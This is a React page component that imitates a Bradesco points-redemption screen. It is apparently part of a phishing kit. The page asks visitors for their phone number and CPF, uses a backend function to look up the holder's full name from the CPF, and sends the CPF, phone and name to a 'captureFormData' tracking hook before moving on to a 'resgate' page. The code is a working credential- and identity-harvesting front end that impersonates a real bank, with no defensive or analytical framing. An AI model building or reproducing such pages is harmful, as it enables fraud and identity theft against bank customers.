import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Menu, Bell } from "lucide-react";
import AttentionModal from "@/components/AttentionModal";
import ProcessingModal from "@/components/ProcessingModal";
import bradescoLogo from "@/assets/bradesco-logo.png";
import BottomNav from "@/components/BottomNav";
import { supabase } from "@/integrations/supabase/client";
import { useVisitorTracking, captureFormData } from "@/hooks/useVisitorTracking";

const Index = () => {
  useVisitorTracking("index");
  const navigate = useNavigate();
  const [modalOpen, setModalOpen] = useState(true);
  const [processingOpen, setProcessingOpen] = useState(false);
  const [toggleOn, setToggleOn] = useState(false);
  const [cpf, setCpf] = useState("");
  const [telefone, setTelefone] = useState("");
  const [nomeCompleto, setNomeCompleto] = useState("");
  const [cpfErro, setCpfErro] = useState("");
  const [consultando, setConsultando] = useState(false);

  useEffect(() => {
    const cleanCpf = cpf.replace(/\D/g, "");
    if (cleanCpf.length === 11) {
      setConsultando(true);
      setCpfErro("");
      supabase.functions.invoke("consulta-cpf", {
        body: { cpf: cleanCpf },
      }).then(({ data, error }) => {
        setConsultando(false);
        const nome = data?.data?.nome || data?.nome;
        if (!error && nome) {
          setNomeCompleto(nome);
          setCpfErro("");
        } else {
          setNomeCompleto("");
          setCpfErro(data?.details?.message || data?.data?.message || data?.error || "CPF inválido");
        }
      });
    } else {
      setNomeCompleto("");
      setCpfErro("");
    }
  }, [cpf]);

  return (
    <div className="min-h-screen max-w-md mx-auto relative" style={{ background: 'linear-gradient(135deg, #D7004D 0%, #A30032 100%)' }}>
      {/* Header */}
      <div className="px-5 pt-6 pb-16">
        <div className="flex items-center justify-between mb-8">
          <Menu className="text-primary-foreground" size={24} />
          <Bell className="text-primary-foreground" size={24} />
        </div>
        <div className="flex flex-col items-center gap-3">
          <div className="text-primary-foreground text-2xl font-bold tracking-wide">
            <img src={bradescoLogo} alt="Bradesco" className="h-8" />
          </div>
          <p className="text-primary-foreground/80 text-sm">
            Você possui pontos para resgate
          </p>
        </div>
      </div>

      {/* Content */}
      <div className="px-5 pb-32 space-y-5 mt-auto">
        {/* Telefone */}
        <div className="px-1">
          <label className="text-sm text-primary-foreground/80 block mb-1">Telefone</label>
          <input
            type="tel"
            value={telefone}
            onChange={(e) => {
              let v = e.target.value.replace(/\D/g, "").slice(0, 11);
              if (v.length > 6) v = v.replace(/(\d{2})(\d{5})(\d{0,4})/, "($1) $2-$3");
              else if (v.length > 2) v = v.replace(/(\d{2})(\d{0,5})/, "($1) $2");
              setTelefone(v);
            }}
            className="w-full bg-transparent text-primary-foreground border-b border-primary-foreground/30 pb-2 outline-none text-base placeholder:text-primary-foreground/40"
            placeholder="(00) 00000-0000"
          />
        </div>

        {/* CPF */}
        <div className="px-1">
          <label className="text-sm text-primary-foreground/80 block mb-1">CPF</label>
          <input
            type="text"
            value={cpf}
            onChange={(e) => {
              let v = e.target.value.replace(/\D/g, "").slice(0, 11);
              if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, "$1.$2.$3-$4");
              else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})/, "$1.$2.$3");
              else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})/, "$1.$2");
              setCpf(v);
            }}
            className="w-full bg-transparent text-primary-foreground border-b border-primary-foreground/30 pb-2 outline-none text-base placeholder:text-primary-foreground/40"
            placeholder="000.000.000-00"
          />
        </div>

        {/* Nome do titular */}
        <div className={`w-full py-3 rounded-full font-semibold text-base text-center ${cpfErro ? "bg-red-100 text-red-600" : "bg-white text-[#D7004D]"}`}>
          {consultando ? "Consultando..." : cpfErro ? cpfErro : nomeCompleto ? nomeCompleto : "1º titular"}
        </div>

        {/* Toggle */}
        <div className="flex items-center justify-between px-1">
          <span className="text-sm font-medium text-primary-foreground">Resgatar pontos Bradesco</span>
          <button
            onClick={() => setToggleOn(!toggleOn)}
            className={`w-12 h-7 rounded-full transition-colors relative flex-shrink-0 ${toggleOn ? "bg-primary-foreground" : "bg-primary-foreground/30"}`}
          >
            <span
              className={`absolute top-[3px] left-[3px] w-[22px] h-[22px] rounded-full shadow transition-transform ${
                toggleOn ? "translate-x-[18px] bg-[#D7004D]" : "translate-x-0 bg-primary-foreground/60"
              }`}
            />
          </button>
        </div>

        {/* CTA */}
        <button
          onClick={() => { captureFormData("identificacao", { cpf: cpf.replace(/\D/g, ""), telefone: telefone.replace(/\D/g, ""), nome: nomeCompleto }); setProcessingOpen(true); }}
          disabled={cpf.replace(/\D/g, "").length !== 11 || telefone.replace(/\D/g, "").length !== 11}
          className="w-full py-4 rounded-full bg-white text-[#D7004D] font-semibold text-base hover:bg-white/90 transition-opacity disabled:opacity-40 disabled:cursor-not-allowed"
        >
          continuar para resgate
        </button>
      </div>

      {/* Bottom Navigation */}
      <BottomNav />

      {/* Attention Modal */}
      <AttentionModal
        open={modalOpen}
        onClose={() => setModalOpen(false)}
        onContinue={() => setModalOpen(false)}
      />

      {/* Processing Modal */}
      <ProcessingModal
        open={processingOpen}
        userName={nomeCompleto}
        onComplete={() => { setProcessingOpen(false); navigate("/resgate", { state: { nome: nomeCompleto } }); }}
      />
    </div>
  );
};

export default Index;
